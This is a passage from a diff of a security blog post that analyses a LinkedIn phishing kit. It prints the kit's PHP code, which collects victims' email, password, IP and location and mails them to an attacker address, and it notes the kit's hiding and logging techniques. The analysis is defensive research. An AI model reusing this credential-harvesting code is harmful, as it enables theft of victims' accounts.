+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ip</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$email_to</span> <span class="o">=</span> <span class="s2">&#34;simon@wmbrep.biz&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$email_subject</span> <span class="o">=</span> <span class="s2">&#34;Linked&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$email_from</span> <span class="o">=</span> <span class="s2">&#34;simon-walter&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$email</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$pass</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$cpass</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cpass&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$email_message</span> <span class="o">.=</span> <span class="s2">&#34;Email: &#34;</span><span class="o">.</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span><span class="o">.</span>   <span class="s2">&#34; </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$email_message</span> <span class="o">.=</span> <span class="s2">&#34;Password: &#34;</span><span class="o">.</span><span class="p">(</span><span class="nv">$pass</span><span class="p">)</span><span class="o">.</span>   <span class="s2">&#34; </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$email_message</span> <span class="o">.=</span> <span class="s2">&#34;IP: &#34;</span><span class="o">.</span><span class="p">(</span><span class="nv">$ip</span><span class="p">)</span><span class="o">.</span>   <span class="s2">&#34; </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$email_message</span> <span class="o">.=</span> <span class="s2">&#34;Country: &#34;</span><span class="o">.</span><span class="p">(</span><span class="nv">$country</span><span class="p">)</span><span class="o">.</span>   <span class="s2">&#34; </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$email_message</span> <span class="o">.=</span> <span class="s2">&#34;City: &#34;</span><span class="o">.</span><span class="p">(</span><span class="nv">$city</span><span class="p">)</span><span class="o">.</span>   <span class="s2">&#34; </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$headers</span> <span class="o">=</span> <span class="s1">&#39;From: &#39;</span><span class="o">.</span><span class="nv">$email_from</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">;</span>
 </span></span></code></pre></div><p>This part of the code defines the options for sending the email. We can see the exfiltration email where all the stolen credentials will be sent (<code>simon@wmbrep.biz</code>), the header of <em>email_from</em> containing <code>simon-walter</code> as well as the subject (<em>Linked</em>) and the message of the email, which - as expected - contains the email address, password, IP address, country and city of the victim.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$email) {
-</span></span><span style="display:flex;"><span>        $emailErr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Please enter your  Email&#34;</span>;
-</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">elseif</span>(<span style="color:#f92672">!</span>$email <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/^\S+@\S+$/&#34;</span>, $email)) {
-</span></span><span style="display:flex;"><span>        $emailErr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Please enter a valid Email&#34;</span>;
-</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">elseif</span>(<span style="color:#f92672">!</span>$pass) {
-</span></span><span style="display:flex;"><span>        $passErr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Password is required&#34;</span>;
-</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">elseif</span>($pass <span style="color:#f92672">!=</span> $cpass){
-</span></span><span style="display:flex;"><span>        $cpassErr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Both Passwords Must Match&#34;</span>;
-</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>        $gotten <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Login Error,Wrong Email or Password, Try Again&#34;</span>;
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mail</span>($email_to, $email_subject, $email_message, $headers);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$email</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$emailErr</span> <span class="o">=</span> <span class="s2">&#34;Please enter your  Email&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="o">!</span><span class="nv">$email</span> <span class="o">||</span> <span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^\S+@\S+$/&#34;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$emailErr</span> <span class="o">=</span> <span class="s2">&#34;Please enter a valid Email&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="o">!</span><span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$passErr</span> <span class="o">=</span> <span class="s2">&#34;Password is required&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$pass</span> <span class="o">!=</span> <span class="nv">$cpass</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$cpassErr</span> <span class="o">=</span> <span class="s2">&#34;Both Passwords Must Match&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$gotten</span> <span class="o">=</span> <span class="s2">&#34;Login Error,Wrong Email or Password, Try Again&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">mail</span><span class="p">(</span><span class="nv">$email_to</span><span class="p">,</span> <span class="nv">$email_subject</span><span class="p">,</span> <span class="nv">$email_message</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="cp">?&gt;</span><span class="err">
 </span></span></span></code></pre></div><p>In these last lines, the string contained in the email address input field is checked against a regular expression to determine if it is a valid email address; an error message is shown otherwise. There are also two additional checks for the password (if the password is entered and if it is the same in the <em>Password</em> input field and in the <em>Confirm Password</em> one). The email is then sent as usual with the PHP function <code>mail()</code>.</p>
-<h2 id="conclusion">Conclusion</h2>
+<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
 <p>In this post we analyzed <code>content.zip</code>: a phishing kit which tricks victims into giving their LinkedIn credentials and pretends to provide a feature to <em>&lsquo;send your business catalogues and quotes via LinkedIn&rsquo;</em>.</p>
-<p>While the exfiltration method used is somehow similar to the one we saw in <a href="https://andpalmier.github.io/posts/phishing-findings-1/">the first episode of this series</a>, this analysis provides interesting findings, especially with the <em>&lsquo;hiding techniques&rsquo;</em> used with: <code>robots.txt</code>, <code>.htaccess</code> and <code>blocker.php</code>.</p>
+<p>While the exfiltration method used is somehow similar to the one we saw in <a href="https://andpalmier.github.io/posts/phishing-findings-1/" target="_blank" rel="noopener">the first episode of this series</a>, this analysis provides interesting findings, especially with the <em>&lsquo;hiding techniques&rsquo;</em> used with: <code>robots.txt</code>, <code>.htaccess</code> and <code>blocker.php</code>.</p>
 <p>Even if the phishing page is always the same, the kit puts it in a new URL at every new visit; so that every victim will have a different URL. The kit also provides logging capabilities for IP address of the victims in <code>vu.txt</code>.</p>
 
-      </div>
 
+  </div>
 
-      <footer>
-        
-
-
-        
-        
-        
-      </footer>
-    </article>
-
-    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
-  <script type="text/javascript" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js" id="MathJax-script"></script>
-  <script>
-    MathJax = {
-      tex: {
-        inlineMath: [
-          ['$', '$'], ['\\(', '\\)']
-        ],
-        processEscapes: true,
-        processEnvironments: true
-      },
-      options: {
-        skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
-      }
-    };
-  </script>
-  </section>
-
-	      </div>
-
-	<footer class="footer">
-
-<hr>
-
-    <section class="container">
-	
-	<p>If you have comments or suggestions, feel free to ping me!</p>
-	
-	
-	
-	
-
-
-<ul>
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://andpalmier.com/tags/phishing/">phishing</a></li>
+      <li><a href="https://andpalmier.com/tags/phishingkit/">phishingkit</a></li>
+      <li><a href="https://andpalmier.com/tags/linkedin/">linkedin</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
     
-    
-    <li>
-	<a href="https://twitter.com/andpalmier/" aria-label="Twitter"  target="_blank" >
-	    <i class="fab fa-twitter" aria-hidden="true"></i>
-	</a>
-    </li>
-    
-    
-    
-    <li>
-	<a href="https://infosec.exchange/@andpalmier/" aria-label="Mastodon"  target="_blank" >
-	    <i class="fab fa-mastodon" aria-hidden="true"></i>
-	</a>
-    </li>
-    
-    
-    
-    <li>
-	<a href="https://github.com/andpalmier/" aria-label="Github"  target="_blank" >
-	    <i class="fab fa-github" aria-hidden="true"></i>
-	</a>
-    </li>
-    
-    
-    
-    <li>
-	<a href="https://www.linkedin.com/in/andpalmier/" aria-label="LinkedIn"  target="_blank" >
-	    <i class="fab fa-linkedin" aria-hidden="true"></i>
-	</a>
-    </li>
-    
-    
-    
-    <li>
-	<a href="mailto:andpalmier@gmail.com" aria-label="Mail"  target="_blank" >
-	    <i class="fas fa-envelope" aria-hidden="true"></i>
-	</a>
-    </li>
-    
-    
-    
-</ul>
-
-    </section>
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://andpalmier.com">andpalmier</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
 </footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a><script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script>
+const images = Array.from(document.querySelectorAll(".post-content img"));
+images.forEach(img => {
+  mediumZoom(img, {
+    margin: 0,  
+    scrollOffset: 40,  
+    container: null,  
+    template: null,  
+    background: 'rgba(0, 0, 0, 0.8)'
+  });
+});
+</script>
 
 
-	  </main>
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
 
-    
-      
-        
-        <script src="/js/dark-mode.min.c2d8a1f8f2660e4a46d776277c72695a1e0ca65939d79f754441d47551604af5.js"></script>
-      
-    
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
 
-	  
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
 
-	  
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
 
-	  
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
 
-    </body>
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
 
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
 
 </html>
